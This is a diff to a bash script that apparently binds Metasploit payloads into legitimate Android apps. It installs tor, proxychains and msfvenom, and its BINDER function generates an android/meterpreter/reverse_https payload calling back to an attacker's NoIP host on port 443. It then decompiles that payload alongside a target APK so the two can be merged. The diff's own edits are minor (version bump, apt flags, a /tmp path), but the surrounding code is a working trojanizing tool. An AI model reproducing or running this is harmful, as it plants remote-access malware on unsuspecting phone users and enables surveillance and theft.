@@ -12,7 +12,7 @@ WHITE="\u001b[37m"
 YELLOW="\u001b[33m"
 
 
-version="67"
+version="68"
 apktool_version="2.6.1"
 TORRC=$(cat /etc/tor/torrc|grep -o "UseBridges 1")
 
@@ -42,28 +42,28 @@ LAN=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*
 # Install Tools
 if [[ ! -f "/usr/bin/git" ]];then
 	echo -e "$GREEN [*]$YELLOW Installing git $YELLOW"
-	apt-get install -y -q git
+	apt-get install -y -qq git
 elif [[ ! -f "/usr/bin/tor" ]];then
 	echo -e "$GREEN [*]$YELLOW Installing tor $YELLOW"
-	apt-get install -y -q tor
+	apt-get install -y -qq tor
 elif [[ ! -f "/usr/bin/curl" ]];then
 	echo -e "$GREEN [*]$YELLOW Installing curl $YELLOW"
-	apt-get install -y -q curl
+	apt-get install -y -qq curl
 elif [[ ! -f "/usr/bin/apktool" ]];then
 	echo -e "$GREEN [*]$YELLOW Installing apktool $YELLOW"
-	apt-get install -y -q apktool
+	apt-get install -y -qq apktool
 elif [[ ! -f "/usr/bin/sendmail" ]];then
 	echo -e "$GREEN [*]$YELLOW Installing sendmail $YELLOW"
-	apt-get install -y -q sendmail
+	apt-get install -y -qq sendmail
 elif [[ ! -f "/usr/bin/proxychains" ]];then
 	echo -e "$GREEN [*]$YELLOW Installing proxychains $YELLOW"
-	apt-get install -y -q proxychains
+	apt-get install -y -qq proxychains
 elif [[ ! -f "/usr/bin/obfs4proxy" ]];then
 	echo -e "$GREEN [*]$YELLOW Installing obfs4proxy $YELLOW"
-	apt-get install -y -q obfs4proxy
+	apt-get install -y -qq obfs4proxy
 elif [[ ! -f "/usr/bin/msfvenom" ]];then
 	echo -e "$GREEN [*]$YELLOW Installing msfvenom $YELLOW"
-	apt-get install -y -q msfvenom
+	apt-get install -y -qq msfvenom
 elif [ "$(apktool -version)" != "$apktool_version" ];then
 	echo -e "$GREEN [*]$YELLOW Upgrading apktool -> $apktool_version $YELLOW"
 	wget -q https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.6.1.jar -O /usr/local/bin/apktool.jar
@@ -172,12 +172,12 @@ function BINDER()
 
 	echo -e "$GREEN [*]$YELLOW Generate Metasploit APK: LHOST: $NoIP PORT:443$YELLOW"
 	service postgresql start
-	msfvenom --platform android -a dalvik -p android/meterpreter/reverse_https LHOST=$NoIP LPORT=443 -o payload.apk
+	msfvenom --platform android -a dalvik -p android/meterpreter/reverse_https LHOST=$NoIP LPORT=443 -o /tmp/payload.apk
 	BANNER
 	echo -e "$GREEN [*]$YELLOW Generate Metasploit APK: LHOST: $NoIP PORT:443$YELLOW"
 	echo -e "$GREEN [*]$YELLOW Decompile: payload.apk $WHITE"
-	apktool -f d payload.apk -o $PAYLOAD > /dev/null
-	rm payload.apk
+	apktool -f d /tmp/payload.apk -o $PAYLOAD > /dev/null
+	rm /tmp/payload.apk
 	echo -e "$GREEN [*]$YELLOW Decompile: $APK $YELLOW"
 	apktool -f d $APK -o $ORGAPK > /dev/null
 
